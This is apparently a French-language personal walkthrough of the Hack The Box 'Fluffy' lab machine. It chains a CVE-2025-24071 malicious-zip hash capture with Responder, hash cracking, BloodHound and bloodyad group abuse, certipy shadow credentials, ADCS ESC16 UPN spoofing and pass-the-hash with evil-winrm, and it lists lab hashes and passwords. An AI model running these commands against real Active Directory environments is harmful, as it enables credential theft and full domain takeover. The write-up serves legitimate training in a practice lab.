# Information

- Platform: HTB
- Difficulty: Easy
- Date: 08/08/26
- Link: https://app.hackthebox.com/machines/Fluffy

# Objective

As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!

# Enumeration

## Nmap

```sh
nmap -sCV $IP -p- --min-rate 1000
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-08 14:52 +0200
Nmap scan report for 10.129.232.88
Host is up (0.030s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-08 19:54:49Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
|_ssl-date: 2026-08-08T19:56:18+00:00; +7h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
|_ssl-date: 2026-08-08T19:56:18+00:00; +7h00m00s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-08T19:56:18+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
|_ssl-date: 2026-08-08T19:56:18+00:00; +7h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49688/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49712/tcp open  msrpc         Microsoft Windows RPC
49725/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-08T19:55:38
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 199.23 seconds
```

## SMB

```sh
smbclient -L \\\\$IP      
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        IT              Disk      
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.232.88 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

smbclient \\\\$IP\\IT -U "j.fleischman"
Password for [WORKGROUP\j.fleischman]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon May 19 16:27:02 2025
  ..                                  D        0  Mon May 19 16:27:02 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 17:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 17:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 17:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 17:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 16:31:07 2025

                5842943 blocks of size 4096. 2188282 blocks available


```

Le fichier Upgrade_Notice.pdf contient une liste de CVE, après analyse on s'aperçoit que la CVE-2025-24071 permet de récupérer un hash netNTLMV2 si un utilisateur dézippe un fichier malicieusement crafté. 
La présence de fichier zip dans le partage nous conforte dans ce sens.


# Foothold

On utilise l'exploit : https://www.exploit-db.com/exploits/52310

Pour cela :
- On met responder en écoute : `responder -I tun0`
- On lance l'exploit avec notre IP : `python3 52310.py -i $PwnIP`
- On l'upload sur le partage IT
Après quelques seconde on reçoit : 
```sh
[SMB] NTLMv2-SSP Client   : 10.129.232.88
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:828d30c22787b417:7F6DFEEEFA5F40EE33910AC743F11DF7:010100000000000080A0EEE1CA28DD01404BE4F901E800EF0000000002000800550059003100420001001E00570049004E002D004E005100520034004E004C005700300047005100430004003400570049004E002D004E005100520034004E004C00570030004700510043002E0055005900310042002E004C004F00430041004C000300140055005900310042002E004C004F00430041004C000500140055005900310042002E004C004F00430041004C000700080080A0EEE1CA28DD01060004000200000008003000300000000000000001000000002000003643C5D211909229A21CCB3E325336632C2C71DBBA1F2645302B3F67370315C70A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100380038000000000000000000
```

En le passant dans hashcat on trouve : 
```sh
P.AGILA::FLUFFY:828d30c22787b417:7f6dfeeefa5f40ee33910ac743f11df7:010100000000000080a0eee1ca28dd01404be4f901e800ef0000000002000800550059003100420001001e00570049004e002d004e005100520034004e004c005700300047005100430004003400570049004e002d004e005100520034004e004c00570030004700510043002e0055005900310042002e004c004f00430041004c000300140055005900310042002e004c004f00430041004c000500140055005900310042002e004c004f00430041004c000700080080a0eee1ca28dd01060004000200000008003000300000000000000001000000002000003643c5d211909229a21ccb3e325336632c2c71dbba1f2645302b3f67370315c70a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100380038000000000000000000:prometheusx-303
```

p.agila:prometheusx-303

# Lateral Movement to user

## Local enumeration

### BloodHound

Voyons ce qu'on peut trouver avec bloodhound et les creds de p.agila :
```sh
bloodhound-python -u $User -p $Pass -d $Domain -dc $DCName -ns $DNSIP -c all
```
 On decouvre que notre compte est membre d'un groupe ayant les droit genericall sur le groupe service accounts :
 ![[Pasted image 20260814213309.png]]
 Et que ce groupe possède genericwrite sur 3 comptes

![[Pasted image 20260814213338.png]]



## Lateral movement vector

On va utiliser les droits pour se connecter en tant que winrm_svc (et ca_svc au passage)
```sh
# On ajoute p.agila au groupe service accounts
bloodyad -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb --host $IP add groupMember 'service accounts' p.agila

# Comme on a un probleme d'horloge on desactive le NTP et se sync sur l'AD
sudo timedatectl set-ntp off
sudo ntpdate dc01.fluffy.htb

# On fait ensuite un shadow credential avec certipy
certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc
certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account winrm_svc

# Puis on se connecte 
evil-winrm -u 'winrm_svc' -H 33bd09dcd697600edf6b3a7af4875767 -i dc01.fluffy.htb

```



# Privilege Escalation

## Local enumeration

### ADCS

On a u compte qui peut gérer des certificats donc énumérons les service de certificats
```sh
# Avec nxc
nxc ldap $IP -u 'winrm_svc' -H 33bd09dcd697600edf6b3a7af4875767 -M adcs
# On confirme la presence d'adcs

# On utilise certipy pour chercher les templates vulnerable
certipy-ad find -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip $IP -vulnerable -enabled -stdout

--snip--
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates

# On voit une vuln identifiée

```
## PrivEsc vector

Allons voir [[ESCXX]]

Suivons le tuto :

```sh
# On change le UPN de ca_svc
certipy-ad account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -user ca_svc -upn 'administrator'

# On demande un certificat pour ca_svc (qui sera donné en tant que administrator)
certipy-ad req -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '$IP' -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'

# On remet le bon UPN a ca_svc
certipy-ad account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -user ca_svc -upn 'ca_svc@fluffy.htb'

# On recupere le hash de administrator
certipy-ad auth -pfx administrator.pfx -domain 'fluffy.htb' -dc-ip $IP

# On PtH
evil-winrm -u 'Administrator' -H 8da83a3fa618b6e3a00e93f676c92a6e -i dc01.fluffy.htb
```

# Pillaging

ca_svc:ca0f4f9e9eb8a092addf53bb03fc98c8

# Flags / Proof

# Lessons Learned

# Related Notes

